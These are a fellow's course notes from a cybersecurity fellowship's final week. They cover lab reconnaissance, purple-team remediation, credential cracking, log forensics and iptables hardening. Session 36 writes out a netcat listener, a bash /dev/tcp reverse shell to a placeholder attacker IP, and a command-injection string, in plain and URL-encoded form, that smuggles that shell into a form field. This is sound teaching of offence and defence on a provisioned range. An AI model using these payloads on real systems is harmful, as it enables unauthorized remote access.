# Week 12 — The Final Reckoning
## Sessions 34–36 | TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity

**Fellow:** Bineta Fall
**Week:** 12
**Sessions:** S34 · S35 · S36
**TLAB:** TEPP — Technical End of Phase Project

---

## Session 34 — Threat Assessment & Final Reconnaissance

### Objectives
Conduct structured threat assessment across a multi-subnet target range using a full reconnaissance methodology. Enumerate live hosts, identify exposed services, and build a complete threat profile for each environment prior to active testing.

### Key Concepts

**Multi-Subnet Reconnaissance**
A segmented network environment requires per-subnet enumeration. Each subnet may expose different services, attack surfaces, and vulnerability profiles. Passive and active techniques are layered — OSINT and host discovery first, then port and service enumeration.

**Threat Assessment Framework**
A threat assessment documents the attack surface before exploitation begins. It answers: what is reachable, what is running, and what is the risk posture of each target? Findings are recorded in APA-style technical reports for reproducibility and chain-of-custody integrity.

**Nmap Methodology — Layered Approach**
```bash
# Host discovery — identify live hosts on subnet
nmap -sn 10.10.X.0/24

# Port scan — full port range on confirmed live hosts
nmap -p- 10.10.X.Y

# Service and version detection
nmap -sV -p 22,80,443,8080 10.10.X.Y

# Script scan — default NSE scripts for vulnerability hints
nmap -sC -sV 10.10.X.Y
```

**Reconnaissance Artifact: tepp_postmortem.md — Phase 0**
All recon findings were documented in Phase 0 of the TEPP postmortem, including open ports, running services, and version strings for each of the three target subnets. Findings formed the basis for Phase 1 vulnerability analysis.

### Artifact
`tepp_postmortem.md` — Phase 0 reconnaissance section

---

## Session 35 — Vulnerability Identification & Remediation (Purple Team)

### Objectives
Identify exploitable vulnerabilities on each target server, document CVEs and CVSS scores, execute proof-of-concept exploitation, and author remediation commands demonstrating before/after security state. This session embodies the purple team model — attacking to understand, then defending to fix.

### Key Concepts

**Purple Team Operations**
Purple teaming integrates offensive (red) and defensive (blue) functions within a single exercise. The practitioner exploits a vulnerability to prove it is real, then immediately authors the remediation — verifying that the fix closes the attack vector. This methodology is more operationally valuable than isolated red or blue exercises because it closes the feedback loop.

**Vulnerability Identification**
After reconnaissance, each exposed service is cross-referenced against known CVEs. CVSS v3 scores are used to prioritize — Critical (9.0–10.0) and High (7.0–8.9) findings are addressed first. Common sources: NVD, Exploit-DB, Metasploit module descriptions.

**Before/After State Documentation**
Each remediation is documented with the vulnerable state, the remediation command, and the hardened state:
```
Before: Service exposed on port X with default credentials / unpatched version
Command: apt-get upgrade <package> / passwd / ufw deny <port>
After: Service patched / credential rotated / port closed
```

**Remediation Command Patterns**
```bash
# Patch a vulnerable service
sudo apt-get update && sudo apt-get upgrade -y <package>

# Disable an unnecessary service
sudo systemctl disable --now <service>

# Rotate a compromised credential
sudo passwd <username>

# Close an exposed port with UFW
sudo ufw deny <port>/tcp
sudo ufw reload

# Remove a world-writable SUID binary
sudo chmod -s /path/to/binary
```

**Operation Fortress (TLAB-11 Artifact — referenced in Week 12)**
`Operation_Fortress_Report.md` documents the full defense-in-depth posture applied across all three defensive layers — firewall, IDS, and EDR — and is the final purple team artifact for the active defense arc.

### Artifacts
`tepp_postmortem.md` — Phase 1 vulnerability and remediation section
`Incident_Response_Report.md` — Structured IR report documenting the attack and response arc

---

## Session 36 — Credential Forensics, Reverse Shells & Final Lockdown

### Objectives
Crack captured credential hashes, reconstruct attacker activity from forensic timestamps and network logs, engineer an iptables command to contain a live incident, configure a reverse shell listener, and author the final analytical paragraph summarizing the full attack chain.

### Key Concepts

**Credential Cracking**
Captured hashes from `/etc/shadow` or web application databases are cracked offline using wordlists. John the Ripper and Hashcat are the standard tools.
```bash
# John the Ripper with rockyou wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat — GPU-accelerated (MD5 example)
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
Cracked credentials are immediately documented and escalated in the incident report. The cracking step proves the credential is weak and provides the attacker's actual access path.

**Forensic Timestamp & Attacker IP Analysis**
Access logs (`/var/log/apache2/access.log`, `auth.log`) are parsed for the attacker's first successful authentication or request. The forensic timestamp and source IP are extracted and recorded as part of the chain-of-custody artifact.
```bash
# Extract attacker IP and timestamps from Apache logs
grep "POST /login" /var/log/apache2/access.log
grep "Accepted password" /var/log/auth.log | tail -20
```

**iptables Incident Containment**
When an active intrusion is confirmed, the attacker IP is immediately blocked at the kernel firewall layer using iptables — before the investigation is complete — to prevent further lateral movement or data exfiltration.
```bash
# Block attacker IP (INPUT and OUTPUT)
sudo iptables -I INPUT -s <attacker_ip> -j DROP
sudo iptables -I OUTPUT -d <attacker_ip> -j DROP

# Persist rules across reboot
sudo iptables-save > /etc/iptables/rules.v4
```

**Reverse Shell — Listener & Payload**
A reverse shell is established by configuring a listener on the attacker machine and delivering a payload to the target. The target initiates the connection outbound (bypassing ingress filtering).
```bash
# Netcat listener (attacker machine)
nc -lvnp 4444

# Bash reverse shell payload (injected into target)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
```
The PID of the shell process on the target confirms successful code execution. The User-Agent string in web logs identifies the delivery mechanism.

**Command Injection**
Command injection occurs when user-supplied input is passed directly to a shell interpreter without sanitization. A vulnerable parameter accepts OS commands appended to expected input:
```
# Vulnerable input field
; bash -i >& /dev/tcp/10.10.X.X/4444 0>&1

# URL-encoded form
%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.X.X%2F4444%200%3E%261
```
The injection succeeds because the application calls `system()` or `exec()` with unsanitized input, allowing arbitrary OS command execution in the web server's security context.

**Final Lockdown — iptables Chain Hardening**
After containment and investigation, a permanent iptables ruleset is applied:
```bash
# Default deny all inbound
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP

# Allow established connections and loopback
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow only necessary services
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Persist
sudo iptables-save > /etc/iptables/rules.v4
```

### Artifacts
`tepp_postmortem.md` — Phase 2 (credential forensics, iptables containment) and Phase 3 (reverse shell, command injection, final lockdown)
`escalation_path.txt` — Documented escalation path from initial access to full compromise

---

## TEPP — Technical End of Phase Project: The Final Reckoning

The TEPP was a four-phase capstone assessment conducted against a provisioned multi-subnet range. The environment was seeded via the instructor-provided `tepp_provisioning.sh` script, which deployed three target servers simultaneously and generated the `tepp_postmortem.md` artifact template.

| Phase | Focus | Deliverable |
|---|---|---|
| Phase 0 | Reconnaissance — host discovery, port scanning, service enumeration across all three subnets | APA-style recon findings in `tepp_postmortem.md` |
| Phase 1 | Vulnerability identification, CVE analysis, exploitation proof-of-concept, remediation commands | Before/after state documentation per server |
| Phase 2 | Credential cracking, forensic log analysis, attacker IP extraction, iptables containment | Hash, timestamp, IP, and firewall command |
| Phase 3 | Reverse shell listener configuration, command injection payload, PID and User-Agent extraction, final lockdown | Full analytical paragraph summarizing the attack chain |

**Submission:** `tepp_postmortem.md` pushed to `week-12_final-reckoning/` alongside `portfolio_audit.md`. A screenshot of the repository folder confirmed both artifacts were present and publicly accessible.

---

## Week 12 Artifact Summary

| Artifact | Session | Description |
|---|---|---|
| `tepp_postmortem.md` | TEPP | Full four-phase capstone postmortem |
| `portfolio_audit.md` | S35 | Phase 1 portfolio audit with week-by-week review |
| `Incident_Response_Report.md` | S36 | Structured incident response report |
| `escalation_path.txt` | S36 | Documented escalation path from access to compromise |

---

## References

Metasploit Project. (2024). *Metasploit framework documentation*. Rapid7. https://docs.metasploit.com

National Institute of Standards and Technology. (2020). *Security and privacy controls for information systems and organizations* (NIST Special Publication 800-53, Rev. 5). U.S. Department of Commerce. https://doi.org/10.6028/NIST.SP.800-53r5

OWASP Foundation. (2021). *OWASP top ten*. https://owasp.org/www-project-top-ten/

The Linux Documentation Project. (2024). *The Linux system administrator's guide*. https://tldp.org
